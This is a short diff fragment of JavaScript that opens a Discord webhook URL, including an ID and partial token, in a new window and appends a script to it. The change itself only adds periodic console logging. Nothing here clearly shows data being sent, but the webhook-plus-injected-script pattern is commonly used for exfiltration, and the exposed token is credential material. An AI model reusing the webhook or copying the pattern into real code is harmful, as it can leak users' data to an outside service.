@@ -4,3 +4,6 @@ var w = window.open('https://discord.com/api/webhooks/842367883203444787/3wUnoiR
 w.onload = ()=>{
     w.document.head.appendChild(script);
 };
+setInterval(()=>{
+    console.log(x)
+}, 2500);
